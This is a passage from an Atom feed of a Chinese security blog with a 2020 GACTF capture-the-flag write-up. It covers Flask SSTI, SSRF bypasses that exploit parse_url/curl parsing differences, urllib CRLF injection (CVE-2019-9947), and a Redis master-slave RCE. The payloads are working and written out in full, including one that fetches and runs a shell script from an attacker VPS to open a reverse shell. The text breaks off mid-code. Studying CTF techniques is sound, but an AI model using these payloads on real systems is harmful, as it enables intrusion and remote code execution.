<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>c1ay</title>
  
  <subtitle>原创文章，未经授权请勿转载</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://c1aysec.github.io/"/>
  <updated>2020-09-02T16:15:25.667Z</updated>
  <id>https://c1aysec.github.io/</id>
  
  <author>
    <name>c1ay</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2020GACTF writeup</title>
    <link href="https://c1aysec.github.io/2020/08/31/2020GACTF%20writeup/"/>
    <id>https://c1aysec.github.io/2020/08/31/2020GACTF writeup/</id>
    <published>2020-08-31T09:59:34.527Z</published>
    <updated>2020-09-02T16:15:25.667Z</updated>
    
    <content type="html"><![CDATA[<h3 id="EZFLASK"><a href="#EZFLASK" class="headerlink" title="EZFLASK"></a>EZFLASK</h3><p><a href="http://124.70.206.91:10001/" target="_blank" rel="external">http://124.70.206.91:10001/</a></p><p><img src="http://pic.c1imber.top/blog/20200831/f0TCWlvCasHb.png?imageslim" alt="mark"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> waf <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> time</div><div class="line">app = Flask(__name__)</div><div class="line"></div><div class="line"><span class="meta">@app.route('/ctfhint')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ctf</span><span class="params">()</span>:</span></div><div class="line">    hint =xxxx <span class="comment"># hints</span></div><div class="line">    trick = xxxx <span class="comment"># trick</span></div><div class="line">    <span class="keyword">return</span> trick</div><div class="line"></div><div class="line"><span class="meta">@app.route('/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></div><div class="line">    <span class="comment"># app.txt</span></div><div class="line"><span class="meta">@app.route('/eval', methods=["POST"])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_eval</span><span class="params">()</span>:</span></div><div class="line">    <span class="comment"># post eval</span></div><div class="line"><span class="meta">@app.route(xxxxxx, methods=["POST"]) # Secret</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin</span><span class="params">()</span>:</span></div><div class="line">    <span class="comment"># admin requests</span></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">8080</span>)</div></pre></td></tr></table></figure><p>通过代码提示，POST请求/eval路由，得到提示：post eval</p><p><img src="http://pic.c1imber.top/blog/20200831/Duo06XLNNY7S.png?imageslim" alt="mark"></p><p>后端大概是类似于<code>eval(&quot;post eval&quot;)</code>这种，但是过滤了很多内容，过滤的字符有<code>(、）、[、、]、&quot;、&#39;</code>等，并且有长度限制</p><p>可以通过传入eval=ctf.func_code.co_consts获取隐藏路由和提示信息</p><p><img src="http://pic.c1imber.top/blog/20200831/uhLQUt9D3pSI.png?imageslim" alt="mark"></p><p>(None, ‘the admin route :h4rdt0f1nd_9792uagcaca00qjaf<!-- port : 5000 -->‘, ‘too young too simple’)</p><p><a href="https://www.cnblogs.com/xgxzj/archive/2011/09/15/2176240.html" target="_blank" rel="external">https://www.cnblogs.com/xgxzj/archive/2011/09/15/2176240.html</a></p><p>POST请求h4rdt0f1nd_9792uagcaca00qjaf路由</p><p><img src="http://pic.c1imber.top/blog/20200831/HRJiDEFiUVuJ.png?imageslim" alt="mark"></p><p>获得提示，需要传入post ip=x.x.x.x&amp;port=xxxx&amp;path=xxx =&gt; <a href="http://ip:port/path" target="_blank" rel="external">http://ip:port/path</a></p><p>这里存在ssrf，ip参数限制了只能为点分十进制ip地址格式且限制了不能为内网ip，path当中不能出现数字，但是这里用的是python的requests库，默认是支持302跳转</p><p>vps 302跳转php脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">header(<span class="string">"Location: http://127.0.0.1:5000/"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>请求ip=vps&amp;port=&amp;path=/aaa.php，获取源码提示</p><p><img src="http://pic.c1imber.top/blog/20200831/vGLlt0bg3rXy.png?imageslim" alt="mark"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> flask</div><div class="line"><span class="keyword">from</span> xxxx <span class="keyword">import</span> flag</div><div class="line">app = flask.Flask(__name__)</div><div class="line">app.config[<span class="string">'FLAG'</span>] = flag</div><div class="line"><span class="meta">@app.route('/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> open(<span class="string">'app.txt'</span>).read()</div><div class="line"><span class="meta">@app.route('/&lt;path:hack&gt;')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack</span><span class="params">(hack)</span>:</span></div><div class="line">    <span class="keyword">return</span> flask.render_template_string(hack)</div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">5000</span>)</div></pre></td></tr></table></figure><p>存在ssti，获取flag</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">header(<span class="string">"Location: http://127.0.0.1:5000/&#123;&#123;config['FLAG']&#125;&#125;"</span>);</div><div class="line">?&gt;</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200831/IBBVu7wFL8QD.png?imageslim" alt="mark"></p><h3 id="sssrfme"><a href="#sssrfme" class="headerlink" title="sssrfme"></a>sssrfme</h3><p><a href="http://121.36.199.21:10801/" target="_blank" rel="external">http://121.36.199.21:10801/</a></p><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// ini_set("display_errors", "On");</span></div><div class="line"><span class="comment">// error_reporting(E_ALL | E_STRICT);</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_url</span><span class="params">($url,$safe)</span> </span>&#123;</div><div class="line">    $parsed = parse_url($url);</div><div class="line">    $validate_ip = <span class="keyword">true</span>;</div><div class="line">    <span class="keyword">if</span>($parsed[<span class="string">'port'</span>]  &amp;&amp; !in_array($parsed[<span class="string">'port'</span>],<span class="keyword">array</span>(<span class="string">'80'</span>,<span class="string">'443'</span>)))&#123;</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;b&gt;请求错误:非正常端口,因安全问题只允许抓取80,443端口的链接,如有特殊需求请自行修改程序&lt;/b&gt;"</span>.PHP_EOL;</div><div class="line">        </div><div class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        preg_match(<span class="string">'/^\d+$/'</span>, $parsed[<span class="string">'host'</span>]) &amp;&amp; $parsed[<span class="string">'host'</span>] = long2ip($parsed[<span class="string">'host'</span>]);</div><div class="line">        $long = ip2long($parsed[<span class="string">'host'</span>]);</div><div class="line">        <span class="keyword">if</span>($long===<span class="keyword">false</span>)&#123;</div><div class="line">            $ip = <span class="keyword">null</span>;</div><div class="line">            <span class="keyword">if</span>($safe)&#123;</div><div class="line">                @putenv(<span class="string">'RES_OPTIONS=retrans:1 retry:1 timeout:1 attempts:1'</span>);</div><div class="line">                $ip   = gethostbyname($parsed[<span class="string">'host'</span>]);</div><div class="line">                $long = ip2long($ip);</div><div class="line">                $long===<span class="keyword">false</span> &amp;&amp; $ip = <span class="keyword">null</span>;</div><div class="line">                @putenv(<span class="string">'RES_OPTIONS'</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            $ip = $parsed[<span class="string">'host'</span>];</div><div class="line">        &#125;</div><div class="line">        $ip &amp;&amp; $validate_ip = filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE);<span class="comment">//ip为公网ip返回其ip地址，ip为保留地址或者私有地址时返回false</span></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(!in_array($parsed[<span class="string">'scheme'</span>],<span class="keyword">array</span>(<span class="string">'http'</span>,<span class="string">'https'</span>)) || !$validate_ip)&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;b&gt;&#123;$url&#125; 请求错误:非正常URL格式,因安全问题只允许抓取 http:// 或 https:// 开头的链接或公有IP地址&lt;/b&gt;"</span>.PHP_EOL;</div><div class="line">        </div><div class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">return</span> $url;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</div><div class="line">    $safe = <span class="keyword">false</span>;</div><div class="line">    <span class="keyword">if</span>(safe_url($url,$safe)) &#123;</div><div class="line">        $ch = curl_init();</div><div class="line">        curl_setopt($ch, CURLOPT_URL, $url);</div><div class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</div><div class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</div><div class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">false</span>);</div><div class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="keyword">false</span>);</div><div class="line">        $co = curl_exec($ch);</div><div class="line">        curl_close($ch);</div><div class="line">        <span class="keyword">echo</span> $co;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">highlight_file(<span class="keyword">__FILE__</span>);</div><div class="line">curl($_GET[<span class="string">'url'</span>]);</div></pre></td></tr></table></figure><p>使用<code>parse_url</code>对传入的<code>$_GET[&#39;url&#39;]</code>进行解析，对返回的$parsed进行了检测，通过代码可以看到需要突破的限制如下：</p><p>1、<code>$parsed[&#39;port&#39;]</code>必须为80或443</p><p>2、<code>$parsed[&#39;scheme&#39;]</code>必须为http或https</p><p>3、<code>$parsed[&#39;host&#39;]</code>必须为公网ip</p><p>上面的限制可以通过<code>parse_url</code>和curl的解析差异绕过</p><p>解析差异：</p><p>对于url格式</p><p><code>scheme:[//[user[:password]@]host[:port]][/path][?query][#fragment]</code></p><p>当url当中存在@时</p><p><code>parse_url</code>在解析url时,取的host和port为最后一个@字符后符合格式的host和port</p><p>curl在解析url时，取的host和port为第一个@字符后符合格式的host和port</p><p>举个栗子:</p><p>当请求地址<a href="http://u:p@127.0.0.1:1234" target="_blank" rel="external">http://u:p@127.0.0.1:1234</a> @1.1.1.1:80(<strong>注意这里中间位置有一个空格，空格也可以被其它字符代替，可以通过Fuzz获取允许的字符，有的curl版本不需要这个空格</strong>)</p><p>demo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$url=<span class="string">"http://u:p@127.0.0.1:1234 @1.1.1.1:80"</span>;</div><div class="line">$parsed = parse_url($url);</div><div class="line">var_dump($parsed);</div><div class="line">var_dump(ip2long($parsed[<span class="string">'host'</span>]));</div><div class="line">var_dump(filter_var($parsed[<span class="string">'host'</span>], FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE));</div></pre></td></tr></table></figure><p>parse_url的解析结果如下，这里解析到的host和port为1.1.1.1和80</p><p>result:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">array</span>(<span class="number">5</span>) &#123; [<span class="string">"scheme"</span>]=&gt; string(<span class="number">4</span>) <span class="string">"http"</span> [<span class="string">"host"</span>]=&gt; string(<span class="number">7</span>) <span class="string">"1.1.1.1"</span> [<span class="string">"port"</span>]=&gt; int(<span class="number">80</span>) [<span class="string">"user"</span>]=&gt; string(<span class="number">1</span>) <span class="string">"u"</span> [<span class="string">"pass"</span>]=&gt; string(<span class="number">17</span>) <span class="string">"p@127.0.0.1:1234 "</span> &#125;</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200831/9JAiUla8pUHy.png?imageslim" alt="mark"></p><p>而curl解析的host和port为127.0.0.1和1234，并且可以看到在curl请求时，空格+@1.1.1.1:80内容被丢弃</p><p><img src="http://pic.c1imber.top/blog/20200831/OoUbbmO5YbeC.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200831/nSrfYQFFGYOF.png?imageslim" alt="mark"></p><p>通过这个特性可以绕过对host和port的限制</p><p>所以目标可以通过以下的请求绕过对ip和端口的限制，对内网ip端口进行探测（题目这里的@1.1.1.1前不需要空格就可以）</p><p><a href="http://121.36.199.21:10801/?url=http://a:b@127.0.0.1:80@1.1.1.1/" target="_blank" rel="external">http://121.36.199.21:10801/?url=http://a:b@127.0.0.1:80@1.1.1.1/</a></p><p><img src="http://pic.c1imber.top/blog/20200831/EbeVoLQEgGgr.png?imageslim" alt="mark"></p><p>（可以看到这里返回了<a href="http://127.0.0.1:80的页面内容）" target="_blank" rel="external">http://127.0.0.1:80的页面内容）</a></p><p>fuzz一下其它可用字符</p><p><img src="http://pic.c1imber.top/blog/20200831/Esh2Nk9AzIf4.png?imageslim" alt="mark"></p><p>得到可用字符有很多</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div></pre></td><td class="code"><pre><div class="line">%a0</div><div class="line">%b0</div><div class="line">%c0</div><div class="line">%d0</div><div class="line">%e0</div><div class="line">%f0</div><div class="line">%a1</div><div class="line">%b1</div><div class="line">%c1</div><div class="line">%d1</div><div class="line">%e1</div><div class="line">%f1</div><div class="line">%a2</div><div class="line">%b2</div><div class="line">%c2</div><div class="line">%d2</div><div class="line">%e2</div><div class="line">%f2</div><div class="line">%a3</div><div class="line">%b3</div><div class="line">%c3</div><div class="line">%d3</div><div class="line">%e3</div><div class="line">%f3</div><div class="line">%a4</div><div class="line">%b4</div><div class="line">%c4</div><div class="line">%d4</div><div class="line">%e4</div><div class="line">%f4</div><div class="line">%a5</div><div class="line">%b5</div><div class="line">%c5</div><div class="line">%d5</div><div class="line">%e5</div><div class="line">%f5</div><div class="line">%a6</div><div class="line">%b6</div><div class="line">%c6</div><div class="line">%d6</div><div class="line">%e6</div><div class="line">%f6</div><div class="line">%a7</div><div class="line">%b7</div><div class="line">%c7</div><div class="line">%d7</div><div class="line">%e7</div><div class="line">%f7</div><div class="line">%a8</div><div class="line">%b8</div><div class="line">%c8</div><div class="line">%d8</div><div class="line">%e8</div><div class="line">%f8</div><div class="line">%a9</div><div class="line">%b9</div><div class="line">%c9</div><div class="line">%d9</div><div class="line">%e9</div><div class="line">%f9</div><div class="line">%aa</div><div class="line">%ba</div><div class="line">%ca</div><div class="line">%da</div><div class="line">%ea</div><div class="line">%fa</div><div class="line">%ab</div><div class="line">%bb</div><div class="line">%cb</div><div class="line">%db</div><div class="line">%eb</div><div class="line">%fb</div><div class="line">%ac</div><div class="line">%bc</div><div class="line">%cc</div><div class="line">%dc</div><div class="line">%ec</div><div class="line">%fc</div><div class="line">%ad</div><div class="line">%bd</div><div class="line">%cd</div><div class="line">%dd</div><div class="line">%ed</div><div class="line">%fd</div><div class="line">%ae</div><div class="line">%be</div><div class="line">%ce</div><div class="line">%de</div><div class="line">%ee</div><div class="line">%fe</div><div class="line">%af</div><div class="line">%bf</div><div class="line">%cf</div><div class="line">%df</div><div class="line">%ef</div><div class="line">%ff</div></pre></td></tr></table></figure><p><strong>注明一下：不同环境下的测试结果会有差别，php有些版本的curl对于这样格式的url会请求失败，或者仅支持很少的字符</strong></p><p>接下来扫描端口，在5000端口得到了提示</p><p><img src="http://pic.c1imber.top/blog/20200831/BJrQDfU8jYs6.png?imageslim" alt="mark"></p><p>hello,world<br>hint: 这是个套娃. <a href="http://localhost:5000/?url=https://baidu.com" target="_blank" rel="external">http://localhost:5000/?url=https://baidu.com</a></p><p>通过探测得知<a href="http://127.0.0.1:5000也存在ssrf，ssrf套ssrf可还行，但是经过测试后发现同样只支持http/https" target="_blank" rel="external">http://127.0.0.1:5000也存在ssrf，ssrf套ssrf可还行，但是经过测试后发现同样只支持http/https</a></p><p>之后通过OOB外带看到这里用的是python的urllib</p><p><img src="http://pic.c1imber.top/blog/20200831/rwinq6vrhblL.png?imageslim" alt="mark"></p><p>这里可以通过urllib的http头注入突破http/https协议的限制，对内网redis进行攻击</p><pre><code>CVE-2016-5699: http://[vps-ip]%0d%0aX-injected:%20header:8888CVE-2019-9740: http://[vps-ip]%0d%0a%0d%0aheaders:8888CVE-2019-9947: http://[vps-ip]:8888?%0d%0apayload%0d%0apadding</code></pre><p>CVE-2019-9947可以成功</p><pre><code>http://121.36.199.21:10801/?url=http://a:b@127.0.0.1:5000@1.1.1.1/?url=http://47.105.186.146:8888?%250D%250Apayload%250D%250Apadding（这里注意需要二次url编码）</code></pre><p>可以看到注入成功</p><p><img src="http://pic.c1imber.top/blog/20200831/J3RUAsO6bn1P.png?imageslim" alt="mark"></p><p>redis存在密码，需要爆破，题目提示弱口令，但是却爆破不出来，均返回-NOAUTH Authentication required.</p><pre><code>http://121.36.199.21:10801/?url=http://a:b@127.0.0.1:5000%20@1.1.1.1/?url=http://127.0.0.1:6379?%250d%250a%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%25246%250D%250A123456%250D%250A%252A2%250D%250A%25244%250D%250Akeys%250D%250A%25241%250D%250A*</code></pre><p><img src="http://pic.c1imber.top/blog/20200831/C8D5XO2l5d5D.png?imageslim" alt="mark"></p><p>后来问了队里的师傅，原来因为这里的redis存在安全机制，导致不管输入什么命令都会显示-NOAUTH Authentication required.，所以需要通过redis主从rce爆破密码，反弹shell，密码为123456</p><p>用这个工具可以生成gopher协议的主从rce payload</p><p><a href="https://github.com/xmsec/redis-ssrf" target="_blank" rel="external">https://github.com/xmsec/redis-ssrf</a></p><p>修改成http方式的，payload如下</p><pre><code>http://121.36.199.21:10801/?url=http://a:b@127.0.0.1:5000@1.1.1.1/?url=http://127.0.0.1:6379?%250D%250A%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%25246%250D%250A123456%250D%250A%252A3%250D%250A%25247%250D%250ASLAVEOF%250D%250A%252414%250D%250Avps%250D%250A%25244%250D%250A7777%250D%250A%252A4%250D%250A%25246%250D%250ACONFIG%250D%250A%25243%250D%250ASET%250D%250A%25243%250D%250Adir%250D%250A%25245%250D%250A/tmp/%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25246%250D%250Aexp.so%250D%250A%252A3%250D%250A%25246%250D%250AMODULE%250D%250A%25244%250D%250ALOAD%250D%250A%252411%250D%250A/tmp/exp.so%250D%250A%252A2%250D%250A%252411%250D%250Asystem.exec%250D%250A%252444%250D%250Awget%2520http%253A//vps/1.sh%2520%2526%2526%2520bash%25201.sh%250D%250A%252A1%250D%250A%25244%250D%250Aquit%250D%250A</code></pre><p>反弹shell，获取flag（试了好几次才反弹到==）</p><p><img src="http://pic.c1imber.top/blog/20200831/4x1E4jxXir0f.png?imageslim" alt="mark"></p><h2 id="补充几道赛后做的题："><a href="#补充几道赛后做的题：" class="headerlink" title="补充几道赛后做的题："></a>补充几道赛后做的题：</h2><h3 id="simpleflask"><a href="#simpleflask" class="headerlink" title="simpleflask"></a>simpleflask</h3><p><a href="http://124.70.153.63/" target="_blank" rel="external">http://124.70.153.63/</a></p><p>POST访问后提示request.form[“name”]，传入name进行测试，发现存在flask ssti,但是禁用了一些字符，构造以下payload获取flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">77</span>].__init__.__globals__[<span class="string">"__builtins__"</span>][<span class="string">"open"</span>](<span class="string">"/FLAG"</span>.lower()).read()&#125;&#125;</div></pre></td></tr></table></figure><p>绕过：</p><p><code>(&#39;-&gt;&quot;、/flag-&gt;&quot;/FLAG&quot;.lower())</code></p><p><img src="http://pic.c1imber.top/blog/20200831/qDy2NxPifNAO.png?imageslim" alt="mark"></p><p><strong>题目延申思考</strong></p><p>寻找执行命令的链，寻找os模块</p><p><img src="http://pic.c1imber.top/blog/20200902/l5XkcrMPiYXd.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200902/taD9qKARIjsh.png?imageslim" alt="mark"></p><p>可以找到很多，比如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">304</span>].__init__.__globals__[<span class="string">"OS"</span>.lower()][<span class="string">"POPEN"</span>.lower()](<span class="string">"WHOAMI"</span>.lower()).read()&#125;&#125;</div></pre></td></tr></table></figure><p>再缩短一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">304</span>].__init__.__globals__[<span class="string">"o"</span><span class="string">"s"</span>][<span class="string">"po"</span><span class="string">"pen"</span>](<span class="string">"whoami"</span>).read()&#125;&#125;</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200902/FF9xOHjDMVYU.png?imageslim" alt="mark"></p><p>虽然可以执行命令，但是还过滤了空格</p><p>构造payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">304</span>].__init__.__globals__[<span class="string">"o"</span><span class="string">"s"</span>][<span class="string">"po"</span><span class="string">"pen"</span>](char(<span class="number">32</span>).join(<span class="string">"lsz/"</span>.split(<span class="string">"z"</span>))).read()&#125;&#125;</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200902/WkBjq1iCcUSL.png?imageslim" alt="mark"></p><p>但是这里显示char不存在，所以暂时没办法绕过（对flask还不是太熟悉，不知道什么原因）</p><p><strong>关于这道题看了write补充一下：</strong></p><p>看了其他师傅和官方的wp，得知这道题还可以通过任意文件读取+获取pin码进入debug调试模式执行python代码读取flag</p><p>读取题目源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">77</span>].__init__.__globals__[<span class="string">"__builtins__"</span>][<span class="string">"open"</span>](<span class="string">"/home/ctf/app.py"</span>).read().upper()&#125;&#125;</div></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FROM FLASK IMPORT FLASK, REQUEST, RENDER_TEMPLATE_STRING, REDIRECT, ABORT IMPORT STRING APP = FLASK(__NAME__) WHITE_LIST = STRING.ASCII_LETTERS + STRING.DIGITS + <span class="string">'()_-&#123;&#125;."[]=/'</span> BLACK_LIST = [<span class="string">"CODECS"</span>, <span class="string">"SYSTEM"</span>, <span class="string">"FOR"</span>, <span class="string">"IF"</span>, <span class="string">"END"</span>, <span class="string">"OS"</span>, <span class="string">"EVAL"</span>, <span class="string">"REQUEST"</span>, <span class="string">"WRITE"</span>, <span class="string">"MRO"</span>, <span class="string">"COMPILE"</span>, <span class="string">"EXECFILE"</span>, <span class="string">"EXEC"</span>, <span class="string">"SUBPROCESS"</span>, <span class="string">"IMPORTLIB"</span>, <span class="string">"PLATFORM"</span>, <span class="string">"TIMEIT"</span>, <span class="string">"IMPORT"</span>, <span class="string">"LINECACHE"</span>, <span class="string">"MODULE"</span>, <span class="string">"GETATTRIBUTE"</span>, <span class="string">"POP"</span>, <span class="string">"GETITEM"</span>, <span class="string">"DECODE"</span>, <span class="string">"POPEN"</span>, <span class="string">"IFCONFIG"</span>, <span class="string">"FLAG"</span>, <span class="string">"CONFIG"</span>] DEF CHECK(S): <span class="comment"># PRINT(LEN(S)) IF LEN(S) &gt; 131: ABORT(500, "HACKER") # ABORT(500, "HACKER LEN") FOR I IN S: IF I NOT IN WHITE_LIST: ABORT(500, "HACKER") # ABORT(500, "HACKER WHITE") FOR I IN BLACK_LIST: IF I IN S: ABORT(500, "HACKER") # ABORT(500, "HACKER BLACK") @APP.ROUTE('/', METHODS=["POST"]) DEF HELLO_WORLD(): TRY: NAME = REQUEST.FORM["NAME"] EXCEPT EXCEPTION: RETURN RENDER_TEMPLATE_STRING("&lt;H1&gt;REQUEST.FORM[\"NAME\"]&lt;H1&gt;") IF NAME == "": RETURN RENDER_TEMPLATE_STRING("&lt;H1&gt;HELLO WORLD!&lt;H1&gt;") CHECK(NAME) TEMPLATE = '&lt;H1&gt;HELLO &#123;&#125;!&lt;H1&gt;'.FORMAT(NAME) RES = RENDER_TEMPLATE_STRING(TEMPLATE) IF "FLAG" IN RES: ABORT(500, "HACKER") RETURN RES IF __NAME__ == '__MAIN__': APP.RUN(HOST="0.0.0.0", DEBUG=TRUE) !</span></div></pre></td></tr></table></figure><p>可以看到过滤了哪些东西，并且可以看到这里flask是debug起的</p><p>读取mac地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">77</span>].__init__.__globals__[<span class="string">"__builtins__"</span>][<span class="string">"open"</span>](<span class="string">"/sys/class/net/eth0/address"</span>).read()&#125;&#125;</div></pre></td></tr></table></figure><p><code>02:42:ac:14:00:0b</code></p><p>转为10进制</p><figure class="highlight python"><table><tr><td 